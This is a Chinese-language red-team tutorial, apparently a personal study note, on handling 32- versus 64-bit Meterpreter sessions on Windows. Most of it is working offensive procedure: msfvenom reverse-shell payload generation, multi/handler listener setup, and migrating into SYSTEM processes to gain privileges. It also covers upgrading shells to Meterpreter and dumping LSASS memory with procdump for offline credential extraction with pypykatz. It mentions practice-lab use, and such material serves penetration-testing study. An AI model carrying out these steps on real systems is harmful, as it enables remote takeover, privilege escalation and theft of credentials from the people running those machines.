# Meterpreter 32/64 位会话专题

> 配套阅读：`02-知识点/02-红队/后渗透/Meterpreter架构与migrate.md`（讲「是什么」）
> 本篇补「怎么在生成阶段就避开」以及「已经上线了 32 位怎么救」。

---

## 0. 一句话结论

```
已知目标是 64 位 Windows  →  生成阶段直接用 windows/x64/...
不确定目标架构          →  先用 x86（32 位）兜底，上线后再判断
已经上了 32 位但需要 64 位能力  →  migrate 到 x64 进程（首选）
```

---

## 1. 为什么会有这个问题：WOW64

64 位 Windows 为了兼容老程序，内置了 **WOW64（Windows 32-bit on Windows 64-bit）** 子系统，让 32 位程序能照常跑。

```
64 位 Windows
├── 原生 64 位进程（x64）    ← 能访问全部内存、全部 API
└── WOW64 子系统
      └── 32 位进程（x86）   ← 只能看到部分世界
```

关键限制：**32 位进程无法直接读写 64 位进程的内存，也加载不了 64 位 DLL。**

所以一个 x86 的 Meterpreter 跑在 x64 系统上时：

| 想做的事 | 为什么失败 |
|---|---|
| `hashdump` | 需要读 64 位 `lsass.exe` / SAM 的内存，32 位进程够不着 |
| `getsystem` | 依赖对 64 位系统进程的 token 操作，容易卡住/超时 |
| `load kiwi` | mimikatz 扩展有架构之分，32 位版本功能受限或加载失败 |
| 读 64 位进程内存 | 直接被 WOW64 隔离挡掉 |

> ⚠️ 注意：**报错信息里完全不会提「架构不匹配」**。你看到的只是「hashdump 报错」「getsystem 超时」这类模糊症状，很容易误判成权限不够或目标加固过。这是这个坑最难自查的地方。

## 2. 生成阶段就避开：先判断目标架构

### 2.1 没有任何 shell 时（外网侦察阶段）

```bash
# nmap 指纹探测
nmap -O --osscan-guess -p 445,3389 <目标IP>

# SMB 指纹（Windows 最常用）
nmap -p 445 --script smb-os-discovery <目标IP>

# MSF 的 SMB 版本扫描
msf6 > use auxiliary/scanner/smb/smb_version
msf6 auxiliary(scanner/smb/smb_version) > set RHOSTS <目标IP>
msf6 auxiliary(scanner/smb/smb_version) > run
```

输出里的 `OS: Windows 7 Professional 7601 Service Pack 1 (x64)` 就是答案。

### 2.2 已经有任意 shell 时（最准）

```cmd
:: 最可靠的一条
wmic os get osarchitecture

:: 备选
systeminfo | findstr /i "System Type"
```

### 2.3 ⚠️ 一个会骗人的环境变量

```cmd
echo %PROCESSOR_ARCHITECTURE%
```

**这条在 32 位进程里会返回 `x86`，哪怕系统是 64 位的。** 如果你是通过 32 位的 WebShell 执行它，就会得到错误的结论。

正确的判断方式是用 WOW64 专属变量：

```cmd
:: 只有 32 位进程跑在 64 位系统上时，这个变量才有值
echo %PROCESSOR_ARCHITEW6432%
```

- 有值（`AMD64`）→ **系统是 64 位**
- 空 → 系统是 32 位

**结论：优先用 `wmic os get osarchitecture`，别用 `%PROCESSOR_ARCHITECTURE%`。**

## 3. Payload 选择决策表

| 目标系统 | 推荐 Payload | 说明 |
|---|---|---|
| 确认 x64 | `windows/x64/meterpreter/reverse_tcp` | 一步到位，避免后面所有麻烦 |
| 确认 x86 | `windows/meterpreter/reverse_tcp` | 32 位系统只能用 32 位 |
| **不确定** | `windows/meterpreter/reverse_tcp` | x86 在 x64 上也能跑，先上线再判断 |

**核心规则：**

```
x86 Payload  →  32 位系统 ✅    64 位系统 ✅（走 WOW64）
x64 Payload  →  32 位系统 ❌    64 位系统 ✅
```

所以「不确定就用 x86」是安全策略——牺牲一点能力，换 100% 能上线。

### 生成与监听必须一致

```bash
# 生成
msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=192.168.0.111 LPORT=5555 \
  -f exe -o shell.exe
```

```text
# 监听
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set lhost 192.168.0.111
set lport 5555
set ExitOnSession false        # ← 会话断了 handler 不退出，继续等重连
run -j
```

> `set ExitOnSession false` 经常被漏。不加的话，第一个会话断开后 handler 就退出了，目标重连时没人接。
> 尤其配合持久化使用时**必须加**。

### 顺带记住这三个名字的区别

```text
windows/meterpreter/reverse_tcp      ← x86  staged    （有斜杠）
windows/meterpreter_reverse_tcp      ← x86  stageless （无斜杠）
windows/x64/meterpreter/reverse_tcp  ← x64  staged
windows/x64/meterpreter_reverse_tcp  ← x64  stageless
```

**前两个只差一个斜杠，是完全不同的 payload，不能混用。**

## 4. 已经上线 32 位了：三种补救

### 方案 A：migrate 到 64 位进程（首选，最快）

```text
meterpreter > ps
```

在输出里找 **`Arch` 列是 `x64`、`User` 是 `NT AUTHORITY\SYSTEM`** 的进程，然后：

```text
meterpreter > migrate <PID>
meterpreter > getuid          # 重新确认权限
meterpreter > sysinfo         # 确认 Meterpreter 变成 x64/windows
```

**为什么这是首选：**

1. Metasploit 的 `migrate` 支持 **32 位会话 → 64 位进程**，会自动投放对应架构的 payload，迁移后你的 Meterpreter 就是 64 位了
2. 如果迁过去的目标进程本身是 SYSTEM，**权限直接继承过来**——等于顺手完成了提权

> 靶场 2 就是这么打的：`getsystem` 一直超时 → `migrate 500` 到 64 位进程 → 拿到 SYSTEM。
> **实战提示：`getsystem` 超时时别死磕，先 `ps` 看有没有 x64 + SYSTEM 的稳定进程，migrate 过去往往更快。**

**迁移进程选择：**

```
优先：x64  +  SYSTEM  +  长期稳定  +  与当前会话同一 Session
好选：svchost.exe、winlogon.exe、explorer.exe
避免：csrss.exe、wininit.exe、services.exe      ← 关键系统进程，注入易崩
避免：lsass.exe                                  ← 见第 5 节
避免：受 EDR 重点保护的进程
```

### 方案 B：`sessions -u` 升级会话

适用于**当前是普通 shell（非 Meterpreter）**的情况：

```text
msf6 > sessions -u <id>
```

它实际调用的是 `post/multi/manage/shell_to_meterpreter`，默认 payload 是 **x86** 的。目标是 64 位时应当手动指定：

```text
msf6 > use post/multi/manage/shell_to_meterpreter
msf6 post(multi/manage/shell_to_meterpreter) > set SESSION <id>
msf6 post(multi/manage/shell_to_meterpreter) > set PAYLOAD windows/x64/meterpreter/reverse_tcp
msf6 post(multi/manage/shell_to_meterpreter) > set LHOST 192.168.0.111
msf6 post(multi/manage/shell_to_meterpreter) > set LPORT 5555
msf6 post(multi/manage/shell_to_meterpreter) > run
```

**注意：** `sessions -u` 是**升级 shell → Meterpreter**，不是**把 32 位 Meterpreter 变成 64 位**。如果当前已经是 Meterpreter，用方案 A。

### 方案 C：用 x64 payload 重新打一遍

最干净但也最费事。适合：目标上还有可复用的入口（同一个 Web 漏洞、同一组凭据），重打成本低。

## 5. ⚠️ 关于 lsass.exe：不要 migrate 进去

很多老 WP 会把 `lsass.exe` 列为迁移候选，理由是「里面全是凭据」。**建议不要这么做：**

| 风险 | 说明 |
|---|---|
| 系统崩溃 | lsass 是关键进程，一旦不稳定 → Windows 直接蓝屏，会话全丢 |
| 注入失败 | 现代系统上 lsass 受 **PPL（进程保护）** 保护，注入多半直接失败 |
| 必被抓 | lsass 是 EDR 监控强度最高的进程之一，注入动作极易触发告警 |

**抓 LSASS 凭据的正确姿势是 dump 内存，不是迁进去：**

```powershell
# 命令行方式
procdump64.exe -accepteula -ma lsass.exe lsass.dmp

# 图形界面方式（最不易被拦）
# 任务管理器 → 详细信息 → lsass.exe → 右键 → 创建转储文件
```

拷回攻击机离线解析：

```bash
pypykatz lsa minidump lsass.dmp
```

> 顺带修正一处：把 Meterpreter **迁移到** lsass 和**转储** lsass 内存是两件事。
> 前者是「住进去」（危险且多半失败），后者是「拍个快照拿出来慢慢看」（正确做法）。

## 6. 三种手段对比

| 手段 | 适用前提 | 得到什么 | 代价 |
|---|---|---|---|
| `migrate <pid>` | 已有 Meterpreter | x64 会话（+ 可能继承 SYSTEM） | 有掉会话风险，需选对进程 |
| `sessions -u` | 当前是普通 shell | Meterpreter 会话 | 需指定 x64 payload，会上传文件 |
| 重新打一遍 | 入口可复用 | 干净的 x64 会话 | 最费时间 |
| 生成时就用 x64 | **一开始就知道是 x64** | 无此问题 | 无 |

**能提前判断就一定提前判断**——后三种都是在补救，第一种才是正解。

## 7. 实战判断流程

```
侦察阶段
   │
   ├─ 能确定架构？
   │     能 ──→ x64 系统 ──→ 直接用 windows/x64/...
   │        └─ x86 系统 ──→ 只能用 windows/...
   │
   └─ 不能 ──→ 用 x86（兼容性兜底）
                 │
                 ▼
            上线后 sysinfo / sessions -l
                 │
                 ├─ 显示 x64/windows ──→ 直接干活
                 └─ 显示 x86/windows ──→ 目标系统是 64 位吗？
                        │                    │
                        │                    ├─ 是 ──→ migrate 到 x64 进程
                        │                    └─ 否 ──→ 保持现状，正常操作
                        ▼
                   hashdump 报错 / getsystem 超时 / kiwi 加载失败
                   → 先查架构，别急着怀疑权限或加固
```

## 8. 常见误区汇总

| 误区 | 实际情况 |
|---|---|
| `%PROCESSOR_ARCHITECTURE%` 能判断系统架构 | 32 位进程里恒为 `x86`，会误导。用 `wmic os get osarchitecture` |
| 「系统是 64 位，所以 payload 必须用 x64」 | 32 位 payload 在 64 位系统上能跑（走 WOW64），只是能力受限 |
| 「`getsystem` 超时 = 权限不够」 | 也可能是 32 位会话访问不了 64 位 token，migrate 换架构即可 |
| 「`sessions -u` 能把 32 位 Meterpreter 升成 64 位」 | 不能。它只把**普通 shell** 升成 Meterpreter |
| 「migrate 是提权漏洞」 | 不是。但如果目标进程是 SYSTEM，权限会被继承过来 |
| 「migrate 到 lsass 最划算」 | 最容易崩系统 + 最容易被抓。要凭据应该 dump 内存 |
| 「Meterpreter 架构 = 系统架构」 | 两者独立。x64 系统上跑着 x86 Meterpreter 是常态 |
